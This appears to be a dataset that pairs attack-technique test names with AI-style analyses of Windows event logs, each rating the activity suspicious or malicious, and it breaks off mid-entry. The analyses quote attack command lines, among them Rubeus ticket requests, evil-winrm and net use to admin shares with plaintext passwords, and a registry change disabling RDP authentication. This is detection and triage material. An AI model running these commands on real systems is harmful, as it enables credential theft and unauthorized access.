Enable Windows Remote Management,"### Detailed Analysis of Windows Event Logs

#### **Application Log:**

1. **Windows Defender Status:**
   - **Event ID 15** indicates that Windows Defender is active. This is a normal system operation and helps ensure that the system is protected against known threats.

#### **Windows PowerShell Log:**

1. **PowerShell Execution:**
   - **Event ID 600**: Multiple entries showing PowerShell starting with command `Enable-PSRemoting -Force`.
   - Enabling PSRemoting can be used for legitimate administrative tasks; however, it can also be exploited by attackers for remote command execution. The use of `-Force` suggests that this command was executed with an intent to bypass user prompts, which could be suspicious depending on the user context.

#### **System Log:**

1. **Windows Update:**
   - **Event IDs 43, 44, and 19** indicate that an update for Microsoft Defender was applied. This is routine behavior for system maintenance and security.

#### **Security Log:**

1. **Login and Privilege Escalation:**
   - **Event ID 4624 and 4672**: Successful logons by user `admin_test` with administrative privileges.
   - **Use of NTLM authentication**: Could be a normal operation depending on the environment, but worth verifying especially if NTLM is not standard. The login from `DESKTOP-3HL5B2P` and additional privileges (SeDebugPrivilege etc.) should be noted as they can provide full control over the system, enabling potential abuse.
   - **Event ID 4634**: Logoff for `admin_test` shortly followed by privilege enabling, suggesting a potential privilege escalation sequence.

#### **Sysmon Log:**

1. **Process Execution:**
   - **Sysmon Event ID 1 and 5**: Multiple executions of native Windows utilities (`wevtutil.exe`, `conhost.exe`, `whoami.exe`, `powershell.exe`) by `admin_test`.
   - The use of `wevtutil.exe` can indicate log operations, possibly to cleanse logs â€”a tactic used post exploitation to cover tracks.
   - Execution of `whoami.exe` is often used in scripting or after exploitation to verify the current user's privileges.

2. **Suspicious Process Behavior:**
   - Execution of PowerShell with `Enable-PSRemoting -Force` corroborates with PowerShell logs suggesting an attempt to ensure remote management capability, which might be suspicious if unintended by the IT department.
   - Frequent spawning of `conhost.exe` might suggest consoles being opened or managed scripts, possibly an indication of someone probing or scripting.

### Assessment of the Situation:

- There is suspicious activity centered around the user `admin_test`. The Enabling of PSRemoting with `-Force`, use of NTLM logons, elevated privileges, and execution of potential log cleaning tools (`wevtutil.exe`) suggest potential post-exploitation activity.
- While some activities might be explained by legitimate administrative tasks, the combination and sequence raises red flags typical of lateral movement or preparation for persistent remote access.

### Resolution:

- **Resolution:** SUSPICIOUS

### Guidance on How to Proceed:

1. **Immediate Actions:**
   - Verify with the IT department whether the Enable-PSRemoting action was legitimate or necessary.
   - Check the physical or virtual presence of `DESKTOP-3HL5B2P` and its activities around the timestamp of the logs.
  
2. **Further Investigation:**
   - Audit recent activities of the `admin_test` account to confirm whether these actions align with expected duties.
   - Review any additional admin accounts for unusual activity, especially those accessing the same computer.
   - Consider increasing logging and monitoring temporarily to catch any recurring suspicious behavior.
  
3. **Remediation:**
   - If unauthorized access is confirmed, change passwords and revoke privileges for `admin_test`.
   - Consider disabling NTLM if it is not widely needed in your environment and aligns with your security policy to prevent similar exploits.

4. **Security Posture Improvement:**
   - Implement multi-factor authentication for all administrative accounts.
   - Regular security training for recognizing signs of malicious access and best practices for system use. 

This assessment suggests a deeper investigation is warranted due to suspicious activities, despite no conclusive evidence of malicious code execution yet being present."
PowerShell Lateral Movement using MMC20,"### Detailed Analysis of the Logs:

#### Summary:

The provided logs from the PowerShell, Sysmon, System, and Security logs for the computer ""Server002"" have been carefully reviewed. Below is the analysis broken down by log type and findings from each:

#### Windows PowerShell Log Analysis:
1. **Command Execution**:
   - The PowerShell logs show commands executed with complex syntax potentially indicative of obfuscation or indirect execution. Specifically, there is a call to invoke ""calc.exe"" through the MMC20 application using PowerShell. This is unusual as there's no direct user interface interaction or user intention visible for launching Calculator this way.
   - Use of PowerShell to execute this command indirectly suggests the potential for malicious intent, such as testing payload execution or exploiting vulnerabilities.

#### Sysmon Log Analysis:
1. **Process Creation**:
   - Sysmon logs indicate the execution of multiple processes including legitimate Windows utilities such as ""wevtutil.exe"", ""conhost.exe"", ""mmc.exe"", and ""calc.exe"". Of particular interest is the execution of ""mmc.exe"" leading to the execution of ""calc.exe"", corresponding to the PowerShell log entries.
   - Serial executions of ""wevtutil.exe"" and ""conhost.exe"" by the user ""SERVER002\\admin_test"" with high integrity indicate administrative privileges on the affected machine.

2. **Administratively Privileged Account**:
   - The Sysmon logs identify actions linked to the ""admin_test"" account, suggesting that this administrative-level account executed these commands.

3. **Network Activity**:
   - No unusual network activity or Command and Control (C2) communications were noted in the entries provided.

#### Security Log Analysis:
1. **Privilege Escalation**:
   - Logs show an NTLM login event for the ""admin_test"" user with several elevated privileges including ""SeDebugPrivilege"" which can be attractive for attackers aiming to inject code into authorized processes.
   - The sequence of events includes login, special privileges being assigned, and subsequent command executions possibly indicating privilege misuse starting at 11:21:14.

2. **Lateral Movement Potential**:
   - Use of privileged accounts and administrative tools assessment shows potential for lateral movement, yet specifics aren't detailed in the provided data for such movement.

#### System Log Analysis:
1. **Windows Update Activity**:
   - Logs show routine update activities with Windows Defender and associated components, indicating no immediate issues there.

### Assessment:

**Suspicious Behavior**:
The use of PowerShell with indirect method executions and invoking a simple application (calc.exe) without clear user-initiated action is unusual and raises red flags typical of a ""test"" phase in a more extended attack chain. The leveraged account possesses high-level permissions, which could represent higher risk if misused. The presence of known malicious tactics such as obfuscation and execution through intermediary processes points toward atypical and suspicious system utilization.

### Resolution: **SUSPICIOUS**

- **Further Investigation Needed**:
  - Confirm the origin and intent of the indirect ""calc.exe"" execution through PowerShell to rule out payload testing.
  - Examine ""admin_test"" account activities and ensure they align with user roles and required permissions.
  - Validate any recent security patches or configuration changes that might have impacted system behavior preceding these activities.

### Guidance on How to Proceed:
- **Isolate the Host**: Immediately, while investigation efforts continue, consider isolating the device while collecting comprehensive process, network, and file activity logs.
- **Conduct a Security Audit**: Review privileged account activities, particularly ""admin_test"", and audit systems for unauthorized changes or access attempts.
- **Deploy Endpoint Detection & Response (EDR) Solutions**: Increase monitoring on similar systems within the network and implement alerting for execution of non-standard paths or methods.
- **Evaluate Security Policies**: Ensure that all systems adhere to the principle of least privilege and have protections against privilege-escalation vulnerabilities.

The current findings trigger the need for in-depth risk assessment and possibly escalate to Incident Response depending on subsequent discoveries."
Exfiltration Over SMB over QUIC (NET USE),"Upon reviewing the provided Windows event logs from the CEO's machine, several elements point to suspicious activity that warrants further investigation. Here's a summary of key findings:

### Analysis of Logs:

**1. Time Discrepancies and Adjustments:**
- The logs indicate time changes executed by the `svchost.exe` process. This in itself can be normal behavior, but frequent or unexplained time adjustments can also be indicative of malicious activity, potentially covering tracks or synchronization with an attacker's timeline.

**2. Suspicious PowerShell Activity:**
- The PowerShell command `powershell.exe & {NET USE * '\\\\example.com\\sales' /TRANSPORT:QUIC /SKIPCERTCHECK, copy 'C:\\path\\to\\file.txt' '*:\\'}` is executed. This command attempts to connect and map network drives with no certificate check and performs file copy operations, which can be indicative of data exfiltration or lateral movement within the network. These actions should be further analyzed to confirm the legitimacy and context.

**3. Wevtutil Usage:**
- The logs show multiple executions of `wevtutil.exe`, a utility to manage event logs. This is often used by adversaries to clear event logs and cover their tracks post-compromise.

**4. High Integrity Level Commands:**
- Executions under high integrity levels and by SERVICE accounts such as `NT AUTHORITY\SYSTEM` can indicate potential privilege escalation, especially if associated with suspicious operations.

**5. Edge Update Activity:**
- There are numerous entries related to `MicrosoftEdgeUpdate.exe`, but without clear indicators of exploitation or misuse in the current logs. This activity can be consistent with routine software updates.

### Conclusion and Resolution:

Given the above findings, the activity captured in the logs can be categorized under the following resolution:

- **SUSPICIOUS**: While some actions could be explained by legitimate activities, such as software updates or time synchronization, the presence of suspicious PowerShell usage, unexpected time corrections, and multiple `wevtutil.exe` executions suggest behavior that is irregular and should be diligently investigated to rule out malicious intent.

### Recommendations:

- **Immediate Investigation**: Escalate the review of any external connections and mapped drives referenced (e.g., `\\example.com\sales`), and determine the legitimacy and necessity of such connections.
- **Audit User and Process Activity**: Review recent user activity, especially concerning the `SERVER002\admin_test` account and processes launched with high integrity.
- **Endpoint Monitoring**: Enhance monitoring on the system for any subsequent attempts at suspicious command execution or changes in time settings.
- **Further Forensics**: Retrieve memory and disk artifacts for a more in-depth analysis to confirm or refute any malicious behavior.

Based on the results of the further investigation, appropriate measures should be taken to ensure system security and integrity."
Execute command writing output to local Admin Share,"### Detailed Analysis of Logs

#### System Log
1. **Kernel-General Logs**: 
   - The logs discuss routine changes such as hive size alterations and time adjustments. These could be due to typical system operations or updates.
   - A backsequential change in time (EventID 1) by `svchost.exe` is noted. While time changes can indicate tampering, this may be part of standard synchronization. However, multiple time change entries could indicate attempts to evade time-based detection mechanisms.

2. **Windows Time-Service Logs**:
   - Connection to `time.windows.com` for time synchronization appears standard, indicating a typical NTP server sync process.
   
3. **Windows Update Logs**:
   - The entries show Microsoft Defender Antivirus updates, which are standard security practices though not directly relevant to the incident.

#### Security Log
1. **Security-Auditing (EventID 4616, 5379)**:
   - The EventID 4616 logs associated with `svchost.exe` display time change details, echoing System Log entries.
   - EventID 5379 shows failed credential-based events with `ReturnCode` `3221226021` which suggests potential unsuccessful or unauthorized access attempts. This suggests reconnaissance or attempted account enumeration.

#### Sysmon Log
1. **Process Creation and Execution**:
   - Multiple instances of `wevtutil.exe`, `conhost.exe`, and the process `HOSTNAME.EXE`, `cmd.exe`, and `whoami.exe` are executed.
   - The crux lies in `cmd.exe` being used to redirect output with an unusual command line for `hostname` to an `ADMIN$` share which can be suspicious as it may indicate a scripted command for enumeration.
   - Widespread high integrity level usage by the user `admin_test` through various system binaries and tools is noted, potentially pointing to privilege misuse or penetration test-like activity.
   
2. **Unusual Activity**:
   - Use of system binaries within scripting or command chaining (`cmd.exe /Q /c hostname`) could indicate a script-based operation that might aim to extract sensitive information or find reachable machines/targets.

#### Application Log
- Windows Defender is operational, as evidenced by Security Product State logs, ensuring proper AV functioning which is a positive signal in defense measures.

### Assessment
The logs present several notable activities:
- Frequent `command prompt` and `system utility executions` (`wevtutil`, `whoami`) under high integrity by a user seem to imply automated scripts or potential lateral movement scripts typically used in penetration testing or attacks.
- Failed credential events and the meticulous redirection of output through ADMIN$ make a strong case for potential compromise or simulation of penetration testing.

### Resolution: SUSPICIOUS

**Guidance to Proceed**:
1. **Additional Monitoring**: Track the user `admin_test` activities, and investigate whether such high-level access was authorized or aligns with daily roles.
2. **User Verification**: Verify permissions and check for any unauthorized accounts or changes in the user list.
3. **Network Analysis**: Consider conducting lateral movement investigations to discern if similar patterns occur on other machines which might signify escalation or dispersion.
4. **Antivirus and System Update**: Ensure all systems are promptly updated with patches and maintain AV signatures current.
5. **Incident Response**: Depending on results from further logs/tracing, consider initiating a full-scale incident response if evidence tips towards a compromise."
Rubeus Kerberos Pass The Ticket,"Based on the analysis of the provided event logs, several indicators suggest potentially malicious or suspicious activity. Here's a breakdown of the findings:

### Suspicious Discoveries:

1. **Use of PsExec**:
   - **PsExec** is a legitimate tool within the Sysinternals Suite that is often used by attackers for lateral movement due to its capability to execute processes on remote systems.
   - In the logs, `PsExec.exe` is executed from a suspicious location: `C:\Users\ADMIN_~1\AppData\Local\Temp\Externalfiles\PsExec.exe`. This is often a red flag as attackers tend to use temporary directories for executing tools.
   - The command line `PsExec.exe -accepteula \\localhost -w c:\\ -c C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\file\\..\\Externalfiles\\rubeus.exe asktgt /user:Administrator /password:Password /domain:SERVER002 /outfile:ticket.kirbi` suggests executing `rubeus.exe` to potentially extract Kerberos Ticket Granting Tickets (TGTs).

2. **Rubeus tool**:
   - Rubeus is an open-source tool used for Kerberos abuse, including ticket extraction and pass-the-ticket attacks.
   - The execution of `rubeus.exe` with the parameters mentioned indicates Kerberos ticket extraction for the user `Administrator`, combined with explicit credentials, which points to credential harvesting attempts.

3. **Temporary Path Execution**:
   - Frequent use of files from temporary paths is another indicator of potentially malicious actions. These directories are not usually used for legitimate tool execution but are often abused by adversaries.

4. **Windows Defender and Security Events**:
   - The logs show Windows Defender was turned on, but no specific security logs indicate the detection of the activities found here, raising concern about the effectiveness or scope of the Defender at this timeframe.

### Potential Malicious Activities:

- The combination of `PsExec` and `rubeus.exe` usage strongly suggests the intention to perform lateral movement and credential dumping, typically associated with penetration testing or malicious operations.
- The explicit usage of Administrator credentials further supports the severity of the compromise, suggesting someone with knowledge of these credentials attempted or succeeded in performing these actions.

### Assessment and Conclusion:

Given these observations, the activity captured in the logs indicates an advanced attempt at credential theft and lateral movement, using tools commonly seen in attack scenarios. The presence of credentials in scripts is particularly concerning as it points to exploitation intentions.

### Resolution: **MALICIOUS**

### Recommended Actions:
1. **Immediate Containment**:
   - Disconnect the affected host (Server002) from the network to prevent further propagation.
  
2. **Credential Reset**:
   - Execute an immediate password reset for the `Administrator` account and any other possibly affected accounts.
  
3. **Investigation and Forensics**:
   - Conduct a full forensic investigation on the machine for further evidence and artifacts of compromise.
   - Review other systems in the network for evidence of similar behavior.
  
4. **Patch and Update**:
   - Ensure all systems are updated and patched to the latest security updates.
  
5. **Audit Logs**:
   - Increase the verbosity of logging on critical systems to detect future malicious activities earlier.

   - Educate employees about phishing and the importance of secure credential handling.

By addressing the above recommendations, future attacks can potentially be mitigated or detected promptly."
Remote Code Execution with PS Credentials Using Invoke-Command,"**Detailed Analysis of Logs:**

Upon analyzing the provided logs, several activities warrant further scrutiny due to potential indicators of compromise. Below are the observations and findings based on the analysis:

1. **Suspicious Windows Security Logs:**
    - Event ID 4672: **Special Privileges Assigned** â€“ The account `admin_test` was assigned a range of high privileges including `SeDebugPrivilege`, which is often targeted by attackers for privilege escalation.
    - Event ID 4624: **Successful Logon** â€“ The `admin_test` user logs in using NTLM authentication. The use of NTLM, especially from external IPs or unexpected machines, can signal pass-the-hash attacks or lateral movement.
    - Events with ID 4634 and 4624 showing ANONYMOUS LOGONs indicate potential unauthorized network access which often precludes attempts to access systems as part of reconnaissance actions.

2. **PowerShell Activities:**
    - The invocation of PowerShell with the command: `Enable-PSRemoting -Force; Invoke-Command -ComputerName $env:COMPUTERNAME -ScriptBlock {whoami}` is suspect. Such remote command execution attempts are typical behaviors observed during reconnaissance or lateral movement by adversaries.

3. **Sysmon Logs:**
    - Several executions of `wevtutil.exe` and `conhost.exe` by `admin_test` are captured. While these can have legitimate uses, frequent or unexpected instances can indicate log tampering or other nefarious activities such as hiding of logs or execution of command line commands without a visible console.
    - Execution of `powershell.exe` with `Enable-PSRemoting` suggests attempts to open up remote access capabilities, potentially increasing the risk of remote exploitation.
    - The combination of `hostname.exe`, `whoami.exe`, and subsequent PowerShell executions could reflect an attempt to gather system information, likely as a precursor for further attacks.

4. **System and Application Logs:**
    - Windows updates and Microsoft Defender logs indicate that the system is running updates correctly, which is a good practice for system security and does not indicate compromise.
    - The presence of `MicrosoftEdgeUpdate.exe` activity related to updates is indicative of normal update procedures for the Microsoft Edge browser.

**Assessment:**

Based on the analysis above, the activities noted, especially those involving PowerShell and NTLM authentication paired with the application of special privileges, could not definitively be linked to benign administrative tasks. The behavior of using PowerShell scripts to establish remote connections and the presence of ANONYMOUS LOGONs strongly hint towards reconnaissance and possible lateral movement by an attacker.

**Final Resolution: SUSPICIOUS**

**Guidance on How to Proceed:**
- **Immediate Actions:**
  - **Isolate the Host:** Prevent further potential malicious actions by isolating the host from the network.
  - **Change Credentials:** Immediate password reset for the user `admin_test` and any accounts accessible from this host.
  - **Conduct Deep-Dive Analysis:** Investigate the origin of NTLM authentication attempts and analyze more NetFlow or firewall logs to trace potential attacker entry points.
  
- **Further Recommendations:**
  - **Review and Tighten Security Policies:** Limit the use of NTLM and disable unneeded privileges to prevent privilege escalation via accounts.
  - **Implement Enhanced Monitoring:** Set up monitoring for use of tools like `wevtutil.exe`, particularly when run by non-system accounts.
  - **Security Awareness Training:** Reinforce security posture with additional training regarding potential phishing or other social engineering attacks that may have facilitated this activity. 

The findings suggest the need for further investigation to confirm any compromise and prevent potential threats."
Disable NLA for RDP via Command Prompt,"After reviewing the provided logs, here is a detailed analysis of potential indicators of suspicious or malicious activity:

1. **Time Change Events:**
   - There are multiple log entries indicating time changes by the process `svchost.exe`. These events (EventID: 1) are seen in both the System and Security logs, showing a discrepancy in the system time (old time vs new time). 
   - The fact that `svchost.exe` is involved is notable, as this executable is often targeted for exploitation due to its legitimate usage by multiple Windows services.

2. **Security Privileges:**
   - The `4672` security event shows that the user `admin_test` was granted several high-level privileges, including `SeDebugPrivilege`, `SeTakeOwnershipPrivilege`, etc. This could indicate a potentially malicious setup of administrative-level permissions that might not be typical for regular operations.

3. **Processes and Command Line Usage:**
   - Sysmon logs show execution of several processes under the `admin_test` user context. Notable is the use of `cmd.exe` with suspicious command line arguments performing Registry modifications, specifically targeting RDP settings:
     - `cmd.exe` executing: `reg add ""HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp"" /v UserAuthentication /d 0 /t REG_DWORD /f`
   - This action modifies RDP (Remote Desktop Protocol) settings, potentially disabling Network Level Authentication (NLA). Such modifications can be indicative of an attempt to weaken security settings for potential unauthorized access.

4. **Application and Security Logs:**
   - The absence of Application logs leaves a gap in understanding potential application-level activities or issues.
   - The Security logs show several attempts or failures related to credential usage or access (EventID: 5379), although specific details are not available, it could relate to brute force attempts or misconfigurations targeting `MicrosoftAccount` or related services.

5. **System Update Activities:**
   - Logs show Windows Update operations and package installations. These look legitimate (e.g., antivirus updates) and may not directly tie to malicious activities. However, they provide context for understanding concurrent legitimate operations.

**Assessment Summary:**

- The modification of RDP settings, especially disabling user authentication, combined with elevated privilege activities, are strong indicators of potentially malicious intent. 
- The time modifications by `svchost.exe` could be a concern; it might be legitimate but should be investigated further for potential tampering.

**Resolution: MALICIOUS**

### Guidance on How to Proceed:
1. **Isolate the Machine:** Immediately isolate the concerned machine from the network to prevent any unauthorized access or lateral movements.
2. **Review RDP Access Logs:** Check past RDP access logs to verify if unauthorized access attempts were successful.
3. **Revert Registry Changes:** Review and potentially revert registry changes that disable user authentication over RDP.
4. **Conduct In-depth Malware Analysis:** Use endpoint protection logs and tools to identify any potential malware related to processes linked with suspicious activities.
5. **Monitor Accounts and Privileges:** Review recent changes to user account privileges, especially those involving high-level permissions.
6. **System Restore or Reimage:** Depending on the results of further analysis, consider restoring the system to a known safe state or reimaging if contamination is detected.

Immediate attention is warranted given the indicators of unauthorized and potentially harmful changes observed in the logs."
crackmapexec Pass the Hash,"In this analysis of the provided Windows event logs, several anomalous events suggest potentially malicious activity:

### Suspicious Behaviors and Findings:

1. **Time Alteration Events (Security and System Log Events 4616):**
   - The logs show a discrepancy in time, where ""NewTime"" is earlier than ""PreviousTime."" This indicates potential time tampering, which can be a tactic used by threat actors to evade detection by altering timestamps in the logs.

2. **Privilege Escalation (Security Log Event 4672):**
   - The user `admin_test` was provided with several high-level privileges such as `SeDebugPrivilege`, `SeTakeOwnershipPrivilege`, and `SeImpersonatePrivilege`. While a privileged account may routinely receive such privileges, the timing and context of these privileges, coupled with other suspicious activities, is concerning.

3. **Unusual Command Execution (Sysmon Log Events):**
   - There is evidence of PowerShell and command-line tools (`cmd.exe`, `wevtutil.exe`, `whoami.exe`) being executed by `admin_test`, along with the use of `crackmapexec.exe`, which is associated with network enumeration and exploitation.

4. **Tool Usage (Sysmon Log Events):**
   - The event shows an execution of `crackmapexec.exe`, which is often used by attackers for various malicious activities such as lateral movement and credential dumping. The command line used here indicates it might be attempting to perform operations as `Administrator`.

5. **Unusual Process and Logon Activity:**
   - Numerous instances of `MicrosoftEdgeUpdate.exe` are seen running under `NT AUTHORITY\SYSTEM`. Although Edge Update is a legitimate process, excessive instances could indicate misuse or an attempt to disguise malicious actions under legitimate processes.

6. **Service and Process Monitoring Tools (Sysmon Log Events):**
   - Processes like `wevtutil.exe`, `conhost.exe`, and `svchost.exe` show frequent executions, some of which fail (`<unknown process>` entries). This can be indicative of malicious tools trying to manipulate services or capture system data. 

### Assessment:

- The combination of manipulated timestamps, execution of known reconnaissance and exploit tools, elevation of privileges, and abnormal instances of critical processes strongly suggests a compromise or attempted compromise of the system.

### Recommended Resolution:

- **MALICIOUS** - The identified activities notably align with typical behaviors seen in security breaches, including privilege escalation, potential use of cracking tools, and manipulation of system settings (time tampering).

### Guidance on How to Proceed:

   - Update systems and software to the latest security patches.
   - Design and conduct staff training on recognizing and reporting suspicious system behaviors and potential social engineering attacks. 

Deploy these resolutions and continue to monitor for additional anomalies to ensure the security of your network environment."
WinRM Access with Evil-WinRM,"Upon analyzing the provided Windows event logs, several indicators of suspicious and potentially malicious activity are observed:

1. **Repeated Credential Requests (Event ID 5379):**
   - The Windows logs show numerous instances of Event ID 5379, indicating repeated attempts to access credentials for the target ""MicrosoftAccount:user=02txoixylodcstop"" with ReturnCode ""3221226021"" (STATUS_LOGON_FAILURE). This consistent failure in accessing credentials may indicate unauthorized or brute-force attempts to authenticate.

2. **Suspicious PowerShell Execution (Sysmon Event ID 1 and PowerShell logs):**
   - Sysmon logs and Windows PowerShell logs indicate the execution of a PowerShell command involving ""evil-winrm,"" a known tool used for remote execution on Windows systems. The command executed was: `""powershell.exe"" & {evil-winrm -i Target -u Domain\Administrator -p P@ssw0rd1}` by the user `SERVER002\admin_test`. The use of this tool without a legitimate purpose is typically associated with malicious activity.

3. **Administrative Privilege Event (Event ID 4672):**
   - The security log contains Event ID 4672, which records a special privileges assignment to the SYSTEM account. This could be typical, but in conjunction with other suspicious activities, it may indicate unauthorized privilege escalation.

4. **Unusual Command-Line Arguments:**
   - There are executions involving command-line arguments used with standard Windows binaries (like `rundll32.exe`, `whoami.exe`) that can be leveraged for malicious purposes. The presence of `whoami.exe` is commonly used by attackers post-compromise for reconnaissance.

Based on these observations, the activities in the event logs indicate signs of potential compromise employing PowerShell to possibly manipulate or attack the system, coupled with repeated failed attempts to access Microsoft account credentials. The execution of tools like ""evil-winrm"" further corroborates suspicious intent.

Invoke-WMIExec Pass the Hash,"Upon analyzing the provided Windows event logs, I have identified several suspicious activities that require further investigation to determine the nature of the behavior:

### Anomalous Behavior Observed:

1. **Frequent Execution of System Utilities:**
   - Multiple instances of `wevtutil.exe` and `conhost.exe` were observed executing in rapid succession. While these processes are legitimate Windows utilities, frequent execution in such a short time, especially by an administrative user, can be indicative of log tampering or a scripted operation.

2. **Execution of Host Networking and User Identification Commands:**
   - Programs such as `HOSTNAME.EXE` and `whoami.exe` were executed. These are often used in scripts for reconnaissance or operational tasks. Their presence alone isnâ€™t inherently malicious but in conjunction with other anomalous events could suggest suspicious automation or a reconnaissance phase.

3. **PowerShell Activity:**
   - There is a significant event (EventID 600 for PowerShell) showing a PowerShell command execution involving network-based script retrieval and execution. The command involves downloading a script (`Invoke-WMIExec.ps1`) from a GitHub repository and using it to execute commands on the local machine. This activity is notably suspicious and could be indicative of a malicious PowerShell script execution or a lateral movement attempt using pass-the-hash techniques.

4. **Time Manipulation Events:**
   - Security and System logs show events (EventID 4616) related to unexpected system time changes executed by `svchost.exe`. Time manipulation can be used to evade certain logging mechanisms or to hide tracks of malicious activity. The NewTime is set before OldTime, indicating a potential replay attack or attempt to cover tracks.

### Indicators of Malicious Activity:

- **PowerShell Script Execution:**
  - The PowerShell command involves downloading and executing scripts directly from the internet, which is a strong indicator of potential compromise. The use of `Invoke-WMIExec.ps1` and similar toolkits are commonly associated with malicious activity such as remote code execution or exploiting credentials.

- **Consistent Use of Administrative Privileges:**
  - The consistent use of the administrative user `SERVER002\admin_test` across multiple executions could point towards privilege misuse or an account thatâ€™s been compromised to execute potentially malicious tasks.

### Assessment & Resolution:

Given the observed activities, especially the suspicious use of PowerShell to execute a script from the internet, along with frequent executions of system utilities that can be used to manipulate logs, this situation clearly aligns with indicators of malicious activity.

**Resolution: MALICIOUS**

### Recommended Actions:

1. **Immediate Isolation:**
   - Isolate the affected system (Server002) from the network to prevent potential lateral spread or further compromise.

2. **Conduct Detailed Forensic Analysis:**
   - Investigate the integrity and source of the `admin_test` account's activities. Check for other signs of compromise on this account across the network.
   - Review network logs for any external communications initiated by the server.

3. **Audit PowerShell Activity:**
   - Enable strict PowerShell logging to capture detailed activities and prevent execution of unauthorized scripts.

4. **Time Sync Verification:**
   - Verify and audit time synchronization settings and logs for unexpected modifications.

5. **Patch and Scan:**
   - Ensure the latest security patches are applied. Conduct a full antivirus and malware scan using updated definitions.

6. **User Awareness and Account Review:**
   - Reiterate security awareness, focusing on recognizing phishing attempts and safe handling of administrative privileges. Perform a comprehensive review of all administrative accounts for unusual activity.

These steps should be taken promptly to mitigate the identified threats and prevent potential future compromises."
Map admin share,"Upon careful analysis of the provided Windows event logs from the CEO's machine, I've identified the following points:

### Suspicious Activities Noticed:

1. **Multiple Command Executions**:
   - There are several executions of `cmd.exe` with the command line involving `net use` to connect to a remote share with what appears to be an administrator account and a hardcoded password: `cmd.exe /c cmd.exe /c ""net use \\Target\C$ P@ssw0rd1 /u:DOMAIN\Administrator""`.
   - This command is highly suspicious for several reasons:
     - It includes a hardcoded password, which could indicate unauthorized access attempts.
     - The command creates a connection to a remote systemâ€™s C$ share, typically used for administrative purposes.
     - Such activity often aligns with lateral movement or unauthorized data access attempts.

2. **Use of Elevated Privileges**:
   - The logs show the user `admin_test` with elevated privileges including `SeDebugPrivilege`, `SeTakeOwnershipPrivilege`, etc., often associated with administrative or system-level tasks (Event ID 4672).
   - The combination of elevated privileges and the execution of remote commands is especially concerning.

3. **Use of `wevtutil.exe` and `conhost.exe` Processes**:
   - There are repeated usages of `wevtutil.exe` and `conhost.exe` processes by the `admin_test` user. While not inherently malicious, `wevtutil` is often used for log management and could be used to clear or manipulate event logs to cover tracks.
   - The timing and frequency could indicate automated or scripted activity.

### Benign Activities Noted:

1. **System Updates and Application Changes**:
   - Updates related to Microsoft Defender Antivirus and Microsoft Edge, such as security intelligence updates (`wuauclt.exe`, `MpSigStub.exe`, etc.), are normal system operations aimed at keeping the system secure and up-to-date.

2. **Routine Security Logs**:
   - Logs showing Windows Defender being active and security checks don't show malicious indicators.

### Assessment:

The most concerning aspect of these logs is the execution of potentially unauthorized or suspicious network commands leveraging administrative credentials. The presence of hardcoded credentials in what appear to be scripts or command executions can be a common tactic used by attackers to move laterally across a network or to access sensitive resources inappropriately.

### Final Resolution:

**MALICIOUS** - The presence of hardcoded administrator credentials being used in commands to access network shares signifies likely malicious activity. This kind of activity is typical in lateral movement or exfiltration scenarios.

### Recommended Actions:

1. **Immediate Isolation**: Isolate the affected system from the network to prevent further unauthorized access or data exfiltration.
2. **Credential Audit**: Review and update credentials for all potentially affected accounts, especially the one observed in the logs.
3. **Forensic Analysis**: Conduct a comprehensive forensic analysis of the system to find the root cause and scope of potential breach.
4. **Enhanced Monitoring**: Increase monitoring on privileged accounts and critical systems for unusual access patterns.
5. **Review Scripts and Automation**: Check for unauthorized scripts or scheduled tasks that might execute such malicious command strings.
6. **User Education & Awareness**: Reinforce best security practices, such as avoiding hardcoded passwords and using secure methods for remote access."
Radmin Viewer Utility,"Upon analysis of the provided Windows event logs, several elements stand out as potentially suspicious and warrant further investigation:

1. **Microsoft Edge Update Execution**: 
   - Multiple instances of **MicrosoftEdgeUpdate.exe** and related components executing with NT AUTHORITY\SYSTEM privileges are observed. These processes have been launched from both the expected directory and a temporary directory (`C:\\Program Files (x86)\\Microsoft\\Temp\\EUA29F.tmp`).
   - While frequent executions might correlate with a legitimate update process, the temporary directory is less common and should be questioned to ensure that it is not being used for any malicious injection or misuse.

2. **Unusual Process Executions by `admin_test` User**:
   - There are logs showing **PowerShell**, **CMD.exe**, and utilities like **wevtutil.exe** and **conhost.exe** being executed by the user `SERVER002\\admin_test`. 
   - **wevtutil.exe** is a legitimate Windows command-line utility to manage event logs, yet its frequent invocation alongside PowerShell and cmd.exe could signal attempts to manipulate logs or execute unauthorized scripts. Powershell is often used in fileless malware attacks, and the combined usage with cmd.exe can be indicative of lateral movement, privilege escalation, or execution of scripts that might evade traditional antivirus detections.

3. **Radmin Viewer Execution**:
   - The execution of **Radmin Viewer** via `cmd.exe` raises alerts. Systems typically do not run remote administration tools without explicit need. This event might reflect attempts for unauthorized remote control, thus necessitating further scrutiny about who initiated this command and the context for remote access.

4. **Use of `whoami.exe`**:
   - Executing `whoami.exe` can be part of routine operations but is also commonly used in recon activity by attackers to verify privileges or gather system information.

5. **High Frequency of Process Creations**:
   - Within a narrow time window (seconds), there is an occurrence of numerous rapid-fire process creation events constituting potentially scripted or automated activity, which could include both benign administrative updates and potentially malicious activity.

**Assessment**:
Given these observations, the activity contains signals of potential misuse, or at least demands clarity on operations, especially about remote control attempts and PowerShell usage. Admin operations might justify the usage patterns, but without further context, there's an inherent risk for security. It's essential to correlate with network logs, verify the integrity and source of the updates, investigate remote tool authorization, and validate the necessity/legitimacy of the operations observed.

**Resolution**: SUSPICIOUS

**Guidance**:
- **Immediate Action**: Isolate further updates or commands to/from suspicious directories and users. If possible, rollback updates temporarily if they cannot be confirmed.
- **Forensic Analysis**: Conduct a deeper investigation into the `TEMP` directories and cross-reference with known malicious hashes and IOCs (Indicators of Compromise).
- **Network Monitoring**: Review network connections and other endpoint EDR alerts correlating in the same timeframe.
- **Audit Privileges**: Confirm that the processes initiated by `admin_test` are sanctioned, and review any unusual privilege assignments especially for systems interacting with edgeupdate binaries.
- **Review Remote Access Usage**: Scrutinize current and past utilization of tools like Radmin Viewer to clarify legitimate vs unauthorized access attempts."
Map Admin Share PowerShell,"### Detailed Analysis

Upon analyzing the Windows event logs provided for the CEO's machine, the following observations are made:

1. **System Log:**
   - Multiple instances of `EventID 24` and `EventID 1` from `Microsoft-Windows-Kernel-General`, which involve time adjustments. These events indicate minor time discrepancies being corrected likely due to time synchronization operations. There is no evidence these are malicious.
   - Windows Update Client logs show regular updates for Microsoft Defender, indicating that security definitions are being maintained (EventIDs 43 and 44).

2. **Windows PowerShell Log:**
